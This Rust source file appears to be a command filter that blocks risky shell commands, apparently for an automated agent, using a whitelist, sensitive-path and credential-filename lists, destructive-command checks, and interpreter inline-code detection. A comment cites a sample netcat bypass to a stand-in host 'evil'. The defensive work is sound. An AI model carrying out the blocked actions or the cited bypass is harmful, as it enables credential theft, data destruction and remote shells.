use fg_core::CheckStage;

pub const SENSITIVE_PATHS: &[&str] = &[
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    "~/.docker",
    "~/.kube",
    "~/.netrc",
    "~/.npmrc",
    "~/.config/gcloud",
    "~/.password-store",
    "~/.config",
    "~/.fusion",
    "/etc",
    "/System",
    "/Library",
    "/usr",
    "/dev",
    "/var/root",
    "/private/etc",
    "/root",
];

pub const WHITELIST: &[&str] = &[
    "python",
    "python3",
    "python3.11",
    "python3.12",
    "python3.13",
    "python3.14",
    "node",
    "npm",
    "npx",
    "bun",
    "yarn",
    "pnpm",
    "deno",
    "pytest",
    "pip",
    "pip3",
    "uv",
    "poetry",
    "ruff",
    "mypy",
    "black",
    "cargo",
    "rustc",
    "rustup",
    "cargo-nextest",
    "swift",
    "swiftc",
    "go",
    "tsc",
    "git",
    "ls",
    "cat",
    "echo",
    "grep",
    "find",
    "mkdir",
    "touch",
    "pwd",
    "which",
    "file",
    "head",
    "tail",
    "wc",
    "sort",
    "uniq",
    "stat",
    "du",
    "df",
    "sed",
    "awk",
    "tr",
    "cut",
    "tee",
    "diff",
    "cmp",
    "rg",
    "fd",
    "bat",
    "exa",
    "jq",
    "gh",
    "make",
    "cmake",
    "true",
    "false",
    "test",
    "rmdir",
    "mv",
    "cp",
    "cd",
];

const CRED_SUFFIXES: &[&str] = &[".pem", ".key", ".p12", ".pfx", ".keystore", ".htpasswd"];

#[derive(Debug, Clone)]
pub struct TokenHit {
    pub binary: String,
    pub reason: String,
    pub stage: CheckStage,
    pub sensitive_target: bool,
}

pub fn split_chain_pub(command: &str) -> Vec<String> {
    split_chain(command)
}

pub fn basename_pub(path: &str) -> &str {
    basename(path)
}

// L4/P0-G5: full-segment scan (no longer returns at the first hit). Multi-segment
// commands (a; b) are judged per segment; evaluate_full collects all hits and
// verdict_from_hits takes the max risk — prevents a later L4 segment from being
// masked by an earlier L3 segment.
pub fn tokenize_check(content: &str) -> Vec<TokenHit> {
    let trimmed = content.trim();
    if trimmed.is_empty() {
        return Vec::new();
    }
    let mut hits = Vec::new();
    if let Some(reason) = check_shell_substitution(trimmed) {
        hits.push(TokenHit {
            binary: String::new(),
            reason,
            stage: CheckStage::Ast,
            sensitive_target: false,
        });
        return hits;
    }
    // A1: shell_words is not a safe parser (flaw B) — fail-closed rejection of
    // shell features it cannot model. bash/zsh expand these constructs; shell_words
    // does not (brace/tilde/glob/heredoc/|& />&N/backslash line continuation).
    // Every unmodeled feature is a bypass channel (the defender parses with
    // weaker syntax than the executor). Adding arms one by one can never be
    // complete; reject uniformly.
    if let Some(reason) = check_unmodeled_shell_features(trimmed) {
        hits.push(TokenHit {
            binary: String::new(),
            reason,
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
        return hits;
    }
    for segment in split_chain(trimmed) {
        let seg = segment.trim();
        if seg.is_empty() {
            continue;
        }
        if let Some(hit) = check_segment(seg) {
            hits.push(hit);
        }
    }
    hits
}

// A1 fail-closed: quote-aware scan for shell features shell_words cannot model.
// Only unquoted regions are scanned (globs/braces inside single/double quotes
// are literals; the shell does not expand them).
// A hit means Block L4 (sensitive_target=true) — zero-trust contract: unknown
// syntax that cannot be proven safe = reject.
fn check_unmodeled_shell_features(command: &str) -> Option<String> {
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = command.chars().peekable();
    while let Some(ch) = chars.next() {
        if in_single {
            if ch == '\'' {
                in_single = false;
            }
            continue;
        }
        if in_double {
            if ch == '"' {
                in_double = false;
            }
            continue;
        }
        match ch {
            '\'' => in_single = true,
            '"' => in_double = true,
            // brace expansion {a,b} or {n..m} — shell_words does not model it; bash expands it into multiple argv.
            // A bare {} is the find -exec placeholder, not a shell expansion; do not reject
            // (avoids find -exec false positives).
            // Only match real brace expansions containing a comma or a .. range.
            '{' => {
                let rest = &command[ch.len_utf8()..];
                if let Some(close) = rest.find('}') {
                    let inner = &rest[..close];
                    if inner.contains(',') || inner.contains("..") {
                        return Some(
                            "brace expansion {a,b}/{n..m} rejected (shell_words cannot model it, A1 fail-closed)"
                                .into(),
                        );
                    }
                }
            }
            // heredoc << / <<- — shell_words mis-parses it as a redirect; the shell reads a multi-line literal.
            '<' if chars.peek() == Some(&'<') => {
                return Some(
                    "heredoc <<EOF rejected (shell_words cannot model it, A1 fail-closed)".into(),
                );
            }
            // |& — bash pipe + stderr merge; shell_words splits it as | + &.
            '|' if chars.peek() == Some(&'&') => {
                return Some(
                    "|& pipe rejected (shell_words cannot model it, A1 fail-closed)".into(),
                );
            }
            // >&N / <&N fd redirection — shell_words does not model fd duplication.
            '>' if chars.peek() == Some(&'&') => {
                return Some(
                    ">&N fd redirection rejected (shell_words cannot model it, A1 fail-closed)"
                        .into(),
                );
            }
            '<' if chars.peek() == Some(&'&') => {
                return Some(
                    "<&N fd redirection rejected (shell_words cannot model it, A1 fail-closed)"
                        .into(),
                );
            }
            // <> read-write open — not modeled by shell_words.
            '<' if chars.peek() == Some(&'>') => {
                return Some(
                    "<> read-write open rejected (shell_words cannot model it, A1 fail-closed)"
                        .into(),
                );
            }
            // backslash line continuation \ + newline — the shell joins argv across lines; shell_words splits.
            '\\' if chars.peek() == Some(&'\n') => {
                return Some("backslash line continuation rejected (shell_words cannot model it, A1 fail-closed)".into());
            }
            // glob * ? [...] — shell_words treats them as literals; the shell expands them into multi-file argv.
            // Only bare globs in unquoted regions are scanned (wildcards inside paths also expand; the shell globs them).
            '*' | '?' => {
                return Some(format!(
                    "glob '{}' rejected (shell_words cannot model it, A1 fail-closed)",
                    ch
                ));
            }
            '[' if command[ch.len_utf8()..].contains(']') => {
                return Some(
                    "glob [...] rejected (shell_words cannot model it, A1 fail-closed)".into(),
                );
            }
            // tilde expansion ~/ or bare ~ — shell_words treats it as a literal; the shell expands it to $HOME.
            // Only word-initial ~ (e.g. cd ~/secret), not mid-path (~ in foo~bar does not expand).
            '~' => {
                return Some(
                    "tilde expansion ~ rejected (shell_words cannot model it, A1 fail-closed)"
                        .into(),
                );
            }
            _ => {}
        }
    }
    None
}

fn check_segment(segment: &str) -> Option<TokenHit> {
    if let Some(reason) = check_redirect_target(segment) {
        return Some(TokenHit {
            binary: String::new(),
            reason,
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    let words = match shell_words::split(segment) {
        Ok(w) => w,
        Err(e) => {
            return Some(TokenHit {
                binary: String::new(),
                reason: format!("command tokenization failed: {}", e),
                stage: CheckStage::Ast,
                sensitive_target: false,
            });
        }
    };
    if words.is_empty() {
        return None;
    }
    let mut idx = 0;
    while idx < words.len() && words[idx].contains('=') && !words[idx].starts_with('=') {
        idx += 1;
    }
    if idx >= words.len() {
        return None;
    }
    let binary = words[idx].clone();
    let binary_basename = basename(&binary).to_string();
    // L3/P0-G5: destructive binaries (rm/dd/mkfs/diskutil/shred/wipefs) are
    // non-whitelisted -> sensitive_target=true forces L4 (absolute Block, same
    // as rm -rf); no longer downgraded to L3 due to flag ordering.
    if DESTRUCTIVE_BINARIES.contains(&binary_basename.as_str()) {
        if let Some(reason) = check_destructive(&binary_basename, &words[idx + 1..]) {
            return Some(TokenHit {
                binary: binary_basename,
                reason,
                stage: CheckStage::Ast,
                sensitive_target: true,
            });
        }
        return Some(TokenHit {
            binary: binary_basename.clone(),
            reason: format!("destructive command: {}", binary_basename),
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    // P0-2 (audit §1.8): non-whitelisted binary fails closed as L4
    // (sensitive_target=true), not L3. The former L3 (sensitive_target=false)
    // could be second-approved via guard.confirm — the env-prefix bypass:
    // `FOO=bar nc evil 4444` skips the env prefix, argv[0]=nc (non-whitelisted)
    // hits L3, and an attacker confirming gets RCE. L4 = absolute Block (H8: no
    // confirm path) cuts the bypass chain. Zero-trust contract: an unknown
    // binary that cannot be proven safe = reject; no human-approval path.
    if !WHITELIST.contains(&binary_basename.as_str()) {
        return Some(TokenHit {
            binary: binary_basename.clone(),
            reason: format!(
                "binary not in whitelist: {} (fail-closed absolute Block)",
                binary
            ),
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    // C3/P0-G5: any whitelisted code interpreter (python/node/bun/deno/cargo/go/swift)
    // with inline-code flags such as -c/-e/-m/--eval/--command/-x/run/script -> L4 Block
    // (interpreter-internal code cannot be parsed recursively; zero-trust contract:
    // arbitrary code execution = absolute Block).
    if INTERPRETER_BINARIES.contains(&binary_basename.as_str()) {
        if let Some(reason) = check_interpreter(&binary_basename, &words[idx + 1..]) {
            return Some(TokenHit {
                binary: binary_basename,
                reason,
                stage: CheckStage::Ast,
                sensitive_target: true,
            });
        }
    }
    if let Some(reason) = check_argv(&binary_basename, &words[idx + 1..]) {
        return Some(TokenHit {
            binary: binary_basename,
            reason,
            stage: CheckStage::Ast,
            sensitive_target: true,
        });
    }
    None
}

const DESTRUCTIVE_BINARIES: &[&str] = &[
    "rm",
    "dd",
    "mkfs",
    "mkfs.ext4",
    "mkfs.apfs",
    "diskutil",
    "shred",
    "wipefs",
    "fdisk",
    "parted",
];

const INTERPRETER_BINARIES: &[&str] = &[
    "python",
    "python3",
    "python3.11",
    "python3.12",
    "python3.13",
    "python3.14",
    "node",
    "bun",
    "deno",
    "ruby",
    "perl",
    "lua",
    "osascript",
];

// C3: interpreter inline-code flag set. A hit means arbitrary RCE -> L4.
// Non-code flags like -m/--print are excluded to avoid false kills (python -m pip).
// Code-injection flags only.
const INTERPRETER_CODE_FLAGS: &[&str] = &["-c", "-e", "-x", "--eval", "--command"];

// C3: interpreter code subcommands (deno eval/run, bun run). A hit means arbitrary RCE -> L4.
const INTERPRETER_CODE_SUBCMD: &[&str] = &["eval", "run", "exec"];

// C3: detect the intent of an interpreter executing inline code (cannot be
// parsed recursively -> L4 absolute Block).
// Only explicit code-injection flags (-c/-e/--eval/--command) and code
// subcommands (eval/run/exec) are intercepted.
// Script paths without flags (python script.py) are not intercepted — legal
// builds like cargo build would be false-killed. The core of the zero-trust
// contract is inline code (zero-cost recursive execution of arbitrary strings);
// explicit flags already cover the most lethal paths.
fn check_interpreter(binary: &str, args: &[String]) -> Option<String> {
    for (i, a) in args.iter().enumerate() {
        if INTERPRETER_CODE_FLAGS.contains(&a.as_str()) {
            return Some(format!(
                "{} {} inline code execution (arbitrary RCE, cannot parse recursively -> absolute Block)",
                binary, a
            ));
        }
        if INTERPRETER_CODE_SUBCMD.contains(&a.as_str()) && i + 1 < args.len() {
            return Some(format!(
                "{} {} <script> arbitrary code execution -> absolute Block",
                binary, a
            ));
        }
    }
    None
}

// L3+L4/P0-G5: destructive command arms. dd of=/dev/* -> L4; rm recursive flag
// variants uniformly L4.
fn check_destructive(binary: &str, args: &[String]) -> Option<String> {
    if binary == "dd" {
        for a in args {
            if let Some(target) = a.strip_prefix("of=") {
                if is_sensitive_path(target) || target.starts_with("/dev/") {
                    return Some(format!(
                        "dd of={} writes to disk/sensitive device -> absolute Block",
                        target
                    ));
                }
            }
        }
        return None;
    }
    if binary == "rm" {
        let combined = args.join(" ");
        let has_recursive = combined.contains("-r") || combined.contains("--recursive");
        let has_force = combined.contains("-f") || combined.contains("--force");
        if has_recursive && has_force {
            return Some(
                "rm recursive+force (-rf/-fr/--recursive --force variants) -> absolute Block"
                    .into(),
            );
        }
        if has_recursive {
            return Some("rm recursive delete (-r/--recursive) -> absolute Block".into());
        }
        return None;
    }
    if matches!(
        binary,
        "mkfs" | "diskutil" | "shred" | "wipefs" | "fdisk" | "parted"
    ) {
        return Some(format!(
            "{} destructive disk/partition operation -> absolute Block",
            binary
        ));
    }
    None
}

fn check_argv(binary: &str, args: &[String]) -> Option<String> {
    match binary {
        // L5: mv/cp destination parsing must model -t DIR / --target-directory=DIR /
        // --target-directory DIR / the -- terminator.
        // The old args.rev().find(!starts_with('-')) took only the last non-flag arg —
        // it missed the -t DIR form (`mv -t /etc f`: last non-flag is f, not /etc) and
        // mistook a source after -- for the dest.
        // GNU mv: dest = explicit -t/--target-directory; otherwise the last positional
        // (skipping flags + everything after -- is positional).
        "mv" | "cp" => {
            if let Some(dest) = parse_mv_cp_dest(args) {
                if is_sensitive_path(&dest) {
                    return Some(format!(
                        "{} destination is in a sensitive path: {}",
                        binary, dest
                    ));
                }
            }
            None
        }
        "sed" => {
            if args.iter().any(|a| a == "-i" || a.starts_with("-i")) {
                return Some("sed -i in-place editing rejected".into());
            }
            None
        }
        "find" => {
            if args
                .iter()
                .any(|a| a == "-exec" || a == "-execdir" || a == "-ok" || a == "-delete")
            {
                return Some(
                    "find -exec/-execdir/-ok/-delete arbitrary command execution rejected".into(),
                );
            }
            None
        }
        "tee" | "chmod" | "cd" => {
            for a in args.iter() {
                if a.starts_with('-') {
                    continue;
                }
                if is_sensitive_path(a) {
                    return Some(format!("{} sensitive path: {}", binary, a));
                }
            }
            None
        }
        "cat" | "grep" | "head" | "tail" | "less" | "more" | "bat" | "rg" => {
            for a in args.iter() {
                if a.starts_with('-') {
                    continue;
                }
                if is_sensitive_path(a) {
                    return Some(format!(
                        "{} read source is in a sensitive path: {} (private key/system file reads rejected)",
                        binary, a
                    ));
                }
                if is_sensitive_filename(a) {
                    return Some(format!(
                        "{} read source is a credential file (sensitive filename pattern): {}",
                        binary, a
                    ));
                }
                if std::path::Path::new(a)
                    .components()
                    .any(|comp| comp == std::path::Component::ParentDir)
                {
                    return Some(format!(
                        "{} path contains a .. component, suspected escape rejected: {}",
                        binary, a
                    ));
                }
            }
            None
        }
        "git" => {
            for a in args.iter() {
                if a == "config" {
                    return Some("git config persistent configuration backdoor rejected".into());
                }
                if a == "-c" {
                    return Some("git -c temporary configuration injection rejected".into());
                }
                if a.starts_with("alias.") || a.starts_with("core.") {
                    return Some("git config alias/core persistent backdoor rejected".into());
                }
            }
            None
        }
        _ => None,
    }
}

// L5: GNU mv/cp destination parsing. Priority:
//   1. -t DIR / --target-directory DIR / --target-directory=DIR (explicit; short and long forms)
//   2. Otherwise the last positional arg (skipping flag values; after the -- terminator all are positional)
// Returns None: only a source without a dest (single-arg mv, illegal command) or no positionals.
// GNU semantics: when -t conflicts with the last positional, -t wins (explicit > implicit);
// multiple -t takes the last (override).
fn parse_mv_cp_dest(args: &[String]) -> Option<String> {
    let mut explicit_dest: Option<String> = None;
    let mut positionals: Vec<String> = Vec::new();
    let mut i = 0;
    let mut only_positional = false;
    let mut skip_value = false;
    while i < args.len() {
        let a = &args[i];
        if skip_value {
            skip_value = false;
            i += 1;
            continue;
        }
        if only_positional {
            positionals.push(a.clone());
            i += 1;
            continue;
        }
        if a == "--" {
            only_positional = true;
            i += 1;
            continue;
        }
        if a == "-t" {
            if i + 1 < args.len() {
                explicit_dest = Some(args[i + 1].clone());
                skip_value = true;
            }
            i += 1;
            continue;
        }
        if let Some(val) = a.strip_prefix("--target-directory=") {
            explicit_dest = Some(val.to_string());
            i += 1;
            continue;
        }
        if a == "--target-directory" {
            if i + 1 < args.len() {
                explicit_dest = Some(args[i + 1].clone());
                skip_value = true;
            }
            i += 1;
            continue;
        }
        if a.starts_with('-') && a.len() > 1 {
            i += 1;
            continue;
        }
        positionals.push(a.clone());
        i += 1;
    }
    if let Some(d) = explicit_dest {
        tracing::debug!(dest = %d, "mv/cp dest via -t/--target-directory");
        return Some(d);
    }
    if positionals.len() >= 2 {
        let d = positionals.last().cloned();
        if let Some(ref d) = d {
            tracing::debug!(dest = %d, "mv/cp dest via last positional");
        }
        d
    } else {
        None
    }
}

fn check_redirect_target(segment: &str) -> Option<String> {
    // P1: OnceLock caches the redirect regex instead of Regex::new per call
    // (the hot path tokenize_check compiled it for every segment).
    use std::sync::OnceLock;
    static RE: OnceLock<regex::Regex> = OnceLock::new();
    let re =
        RE.get_or_init(|| regex::Regex::new(r">\s*([^\s|&;]+)").expect("redirect regex (static)"));
    for cap in re.captures_iter(segment) {
        if let Some(target) = cap.get(1) {
            if is_sensitive_path(target.as_str()) {
                return Some(format!(
                    "redirect target is in a sensitive path: {}",
                    target.as_str()
                ));
            }
        }
    }
    None
}

pub fn is_sensitive_path(path: &str) -> bool {
    if !path.starts_with('/') && !path.starts_with('~') {
        return false;
    }
    let expanded = expand_tilde(path);
    for sens in SENSITIVE_PATHS {
        let sens_exp = expand_tilde(sens);
        if expanded == sens_exp || expanded.starts_with(&format!("{}/", sens_exp)) {
            return true;
        }
    }
    false
}

pub fn is_sensitive_filename(path: &str) -> bool {
    let fname = std::path::Path::new(path)
        .file_name()
        .map(|f| f.to_string_lossy().to_lowercase())
        .unwrap_or_default();
    if fname.is_empty() {
        return false;
    }
    if fname == "id_rsa" || fname.starts_with("id_rsa.") || fname.starts_with("id_rsa_") {
        return !fname.ends_with(".pub");
    }
    CRED_SUFFIXES.iter().any(|s| fname.ends_with(s))
}

fn check_shell_substitution(command: &str) -> Option<String> {
    if command.contains("$(") || command.contains('`') {
        return Some("command substitution $(...)/backticks rejected".into());
    }
    if command.contains("<(") || command.contains("<<<") {
        return Some("process substitution <(...)/<<< rejected".into());
    }
    None
}

fn expand_tilde(path: &str) -> String {
    if path == "~" {
        std::env::var("HOME").unwrap_or_else(|_| "~".to_string())
    } else if let Some(rest) = path.strip_prefix("~/") {
        format!("{}/{}", std::env::var("HOME").unwrap_or_default(), rest)
    } else {
        path.to_string()
    }
}

fn basename(path: &str) -> &str {
    match path.rsplit('/').next() {
        Some(s) if !s.is_empty() => s,
        _ => path,
    }
}

fn split_chain(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut current = String::new();
    let mut chars = command.chars().peekable();
    let mut in_single = false;
    let mut in_double = false;
    while let Some(ch) = chars.next() {
        if in_single {
            current.push(ch);
            if ch == '\'' {
                in_single = false;
            }
            continue;
        }
        if in_double {
            current.push(ch);
            if ch == '"' {
                in_double = false;
            }
            continue;
        }
        match ch {
            '\'' => {
                in_single = true;
                current.push(ch);
            }
            '"' => {
                in_double = true;
                current.push(ch);
            }
            '&' if chars.peek() == Some(&'&') => {
                chars.next();
                segments.push(std::mem::take(&mut current));
            }
            '|' if chars.peek() == Some(&'|') => {
                chars.next();
                segments.push(std::mem::take(&mut current));
            }
            ';' | '\n' | '\r' | '|' => {
                segments.push(std::mem::take(&mut current));
            }
            _ => current.push(ch),
        }
    }
    if !current.is_empty() {
        segments.push(current);
    }
    segments
}
